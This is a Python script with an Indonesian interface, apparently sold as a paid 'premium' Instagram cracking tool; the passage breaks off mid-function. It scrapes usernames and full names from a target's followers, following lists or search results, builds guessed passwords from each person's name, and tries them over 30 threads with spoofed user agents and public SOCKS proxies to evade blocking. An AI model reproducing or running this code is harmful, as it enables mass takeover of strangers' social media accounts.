# coding:utf-8
#/usr/bin/python
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import json
	import uuid
	import hmac
	import rich
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'[!] {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
        import rich
except ImportError as e:
        print (f" {M}• {P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
        os.system(f"python -m pip install {e.name} &> /dev/null")
        os.system(f"python -m pip install requests &> /dev/null")

from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
hapus  = '[/]'
biru_m = '[bold cyan]'

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

color_table = "#FFFFFF"
color_rich = "[#00C8FF]"
sys.stdout.write('\x1b]2; Insta Nazri XD\x07')

try:os.mkdir('data')
except:pass
try:os.mkdir('result')
except:pass

CY='\033[96;1m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
M3 = "[#d700d7]" # Magenta
bc = '[bold cyan]'
R2 = random.choice([M3, J2, H2, K2, O2, N2, M2, B2])

a = "[#8700af]"
b = "[#87875f]"
c = "[#8787af]"
d = "[#87afff]"
e = "[#87ff00]"
R3 = random.choice([a, b, c, d, e])

USN="Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone9,4; iOS 10_3_3; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)"
# USN=""Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (31/12; 540dpi; 1080x2158; samsung; SM-G991B; o1s; exynos2100; fr_FR; 337202359)"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
HARIS, HARIS1, method, ugen, ugen3, ugen2, baru, zx, prox, menudump, uazpepek = {}, {}, [], [], [], [], [], [], [], [], []
s = requests.Session()
UaNgentodMuach = []

USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method=[]
ugen=[]
ugen3=[]
ugen2=[]
s=requests.Session()
baru=[]
for tu in range(1000):
            a = random.choice([
            'RMX2040',
            'RMX2001',
            'RMX1827',
            'RMX2185',
            'RMX2030',
            'RMX3201',
            'RMX2195',
            'RMX2027'])
            b = random.randrange(73, 99)
            c = random.randrange(4200, 4900)
            d = random.randrange(40, 150)
            useragent = f'''Mozilla/5.0 (Linux; U; Android 10; {a} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
            baru.append(useragent)
for xd in range(1000):
    build_nokiax = ['NMF26O','MRA58K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android 11'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c=f'{gt}'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uak=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uak)
	
	a='Mozilla/5.0 (Linux;'
	b='Android'
	c=random.randrange(4, 9)
	d='11'
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(700, 999)
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
	h='Chrome/103.0.5060.129'
	i=random.randrange(60,99)
	j='0'
	k=random.randrange(4310,4799)
	l=random.randrange(70,150)
	m='Mobile DuckDuckGo/5 Safari/537.36'
	uaku=(f'{a} {b} {c}; {d}{e}{f}{n}) {g} {h}{i}.{j}.{k}.{l} {m}')
	ugen2.append(uaku)

try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

try:
	with requests.Session() as ses:
	      url = ses.get("http://ip-api.com/json/").json()
	      IP  = url["query"]
	      CN = url["country"]
	      RN = url["regionName"]
	      AS = url["as"]
	      TZ = url["timezone"]
	      CC = url["countryCode"]
except KeyError:
	IP = "-"
	CN = "-"
	RN = "-"
	AS = "-"
	CC = "-"

def clear():
	try:os.system('clear')
	except:pass

def RemoveCookie():
    try:os.remove("data/cookie.txt")
    except:pass
    try:os.remove("data/user.txt")
    except:pass

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
# CLEAR
def clear():
    os.system('clear')
      
#--------------------[ BANNER ]-----------------------#
def banner():
    clear();cetak(nel(f'''{asu}
    
 ██████╗██████╗ ██╗   ██╗██╗     
██╔════╝██╔══██╗██║   ██║██║     
██║     ██████╔╝██║   ██║██║     
██║     ██╔══██╗██║   ██║██║     
╚██████╗██████╔╝╚██████╔╝███████╗
 ╚═════╝╚═════╝  ╚═════╝ ╚══════╝
                      '''
 , style='purple',
 title=f'{M2}•{H2} PREMIUM TOOLS {M2}•{P2}', subtitle=f'• {P2}{waktu()}{U2} •'))
    
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 
#----------------------[ MAIN ]---------------------#

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='bright_white ')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

#---------------------+--[ LOGIN-COOKIES ]----------------------#

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            io = '[green][1] Login Menggunakan Cookie\n[2][bright_white] Login Menggunakan Username & Password [OFF]'
            oi = nel(io, style='bold green ')
            cetak(nel(oi, title='Pilih Cara Kamu Login'))
            loginpil=input(f"[•] Masukan Pilihan :{C} ")
            if loginpil=='1':
                wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                wel2 = mark(wel, style='bright_white')
                sol().print(wel2)
                us=input(f'{H}[•] Masukan Username Instagram :{C}')
                cok=input(f'{H}[•] Masukan Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python IGEH.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
        
 #-----------------------[ LOGIN-MANUAL ]-----------------------#
 
def login():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
        wel2 = mark(wel, style='bright_white')
        sol().print(wel2)
        us=input(f"{CY}[•] Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'{CY}[•] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='bright_white ')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='bright_white')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='bright_white ')
        sol().print(wel2)
        login()
        
def User_Agent():
	dpi_phone = [

		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x1812','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'

	return User_Agent


def user_agent():
	resolutions = ['1080x2178', '1080x2352', '1080x2130', '1080x2138', '1280x720', '1080x2123', '1080x2150' ,'1080x2176']
	versions = ['SM-G991U', 'CPH2211', 'SM-N986U', 'SM-G981V','SM-A105F','Infinix-X6810' ,'bright_whitemi Note 8' ,'Mi Note 10']
	dpis = ['120', '160', '320', '420' ,'440' ,'480']

	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)

	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

#--------------------------[ METODE-CRACK ]-------------------------#

class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''[{H}â€¢{C}]Selamat Datang : {nama}
[{H}â€¢{C}]Username       : {self.username}
[{H}â€¢{C}]Followers      : {followers}
[{H}â€¢{C}]Following      : {following}
[{H}â€¢{C}]Version        : 3.6'''
            print(welcome)
            prints(Panel('[[green1]01[bold white ]] [bright_white]Crack Dari Pencarian         [bold white ][[green1]02[bold white ]] [bright_white]Crack Dari Pengikut\n[bold white ][[green1]03[bold white ]] [bright_white]Crack dari Mengikuti         [bold white ][[green1]04[bold white ]] [bright_white]Checkpoint Detector  \n[bold white ][[green1]05[bold white ]] [bright_white]Lihat Hasil Crack            [bold white ][[green1]06[bold white ]] [bright_white]Bot Auto Unfollow\n[bold white ][[green1]R[bold white ]] [bright_white] informasi Script             [bold white ][[green1]C[bold white ]] [bright_white]Changelog\n[bold white ][[green1]E[bold white ]] [bright_white] Exit',title='MENU',style='purple'));os.system("play-audio data/sora.mp3")


    def BUG(self):
        donasi=f'''[white]- Hai Selamat Datang Di Script Saya Mungkin Kamu Adalah Penguna Baru !
- Script Masih Dalam Perkembangan 
- Saya Sarankan Menggunakan Kartu Indosat,xl,exis,3
- Harga Script
- 150k/bulan
- 500k Open Source 
- Silahkan menghubungi kontak saya 
- +6287752662364
- SoraaðŸ”¥ðŸ”¥ '''
        cetak(nel(donasi, title=' â€¢ informasi â€¢ ', style='green1'))
        sleep(0.50)
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='bold green1')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='bold green1')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='bold green1')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        kel='# Apakah anda yakin ingin keluar ?'
        kel1=mark(kel,style='bold bright_white ')
        sol().print(kel1)
        x=input(f'\n{H}[â€¢] Jawaban [y/t] : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py ')
        elif x in ('t','T'):
            os.system('python run.py ')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self, cookie, api, id):
        if 'sukses' in lisensiku:
            try:
                idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
                idtar1 = mark(idtar, style='red1')
                sol().print(idtar1)
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}[!]  KONEKSI INTERNET TERPUTUS  {C}')
            except Exception as e:
                print(
                    f'\n{M}[!] UNSERNAME TIDAK DI TEMUKAN {C}')
            return internal
        else:
            lisensi()
            
    def ifoAPI(self, cookie, api, id):
        if 'sukses' in lisensiku:
            try:
                idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
                idtar1 = mark(idtar, style='red1')
                sol().print(idtar1)
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'mengikuti' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}[!]  KONEKSI INTERNET TERPUTUS  {C}')
            except Exception as e:
                print(
                    f'\n{M}[!] UNSERNAME TIDAK DI TEMUKAN {C}')
            return internal
        else:
            lisensi()

    def passwordAPI(self,xnx):
        idtar = f'[red1]              	          {len(internal)} ID'
        idtar1 = nel(idtar, style='purple ')
        cetak(nel(idtar1, title='TOTAL ID TERKUMPUL'))
        komb = '[bright_white][1][/bright_white] [green1]Nama,Nama123,Nama1234[/green1]\n[bright_white][2][/bright_white] [green1]Nama,Nama123,Nama1234,Nama12345[/green1]\n[bright_white][3][/bright_white] [green1]Nama,Nama123,Nama1234,Nama12345,Nama123456[/green1]\n[bright_white][4][/bright_white] [green1]Nama,Nama123,Nama1234,Nama12345,Nama1122[/green1]\n[bright_white][5][/bright_white] [green1]Password Manual[/green1]'
        komb1 = nel(komb, style='purple ')
        cetak(nel(komb1, title='MASUKKAN PILIHAN PASSWORD'))
        c = input(f'{H}[â€¢] MASUKKAN PILIHAN ANDA :{C} ')
        if c == '1':
            self.generateAPI(xnx, c)
        elif c == '2':
            self.generateAPI(xnx, c)
        elif c == '3':
            self.generateAPI(xnx, c)
        elif c == '4':
            self.generateAPI(xnx, c)
        elif c == '5':
            ui = '# PASSWORD MANUAL'
            uu = mark(ui, style='')
            sol().print(uu)
            print(f'{M} Contoh jangan,crack,mulu')
            print('')
            zx = input(f'{CY}[â€¢] List password :{C} ')
            self.generateAPI(xnx, c, zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        io=f'[bright_white][â€¢] Hasil OK disimpan ke: result/{day}.txt\n[â€¢] Hasil CP disimpan ke: result/{day}.txt'
        oi = nel(io, style='purple ')
        cetak(nel(oi, title='CRACKING START'))
        ipku='# [ðŸ”¥] ON-OFF MODE PESAWAT SETIAP 200 ID AGAR TERHINDAR DARI SPAM IP'
        ipku1=mark(ipku,style='red1')
        sol().print(ipku1)
        with ThreadPoolExecutor(max_workers=30) as shinkai:
            for i in user:
                try:
                    username = i.split("|")[0]
                    password = i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w) < 3:
                            continue
                        else:
                            w = w.lower()
                            if o == "1":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123',w]
                                else:
                                    sandi = [w+'123',w]
                            elif o == "2":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234', w+'12345']
                                else:
                                    sandi = [w+'123', w, w+'1234', w+'12345']
                            elif o == "3":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234', w +'12345', w+'123456', password.lower()]
                                else:
                                    sandi = [w+'123', w, password.lower()]
                            elif o == "4":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234',w+'12345', w+'1122', password.lower()]
                                else:
                                    sandi = [w+'123', w+'1234', w +'12345', password.lower()]
                            elif o == "5":
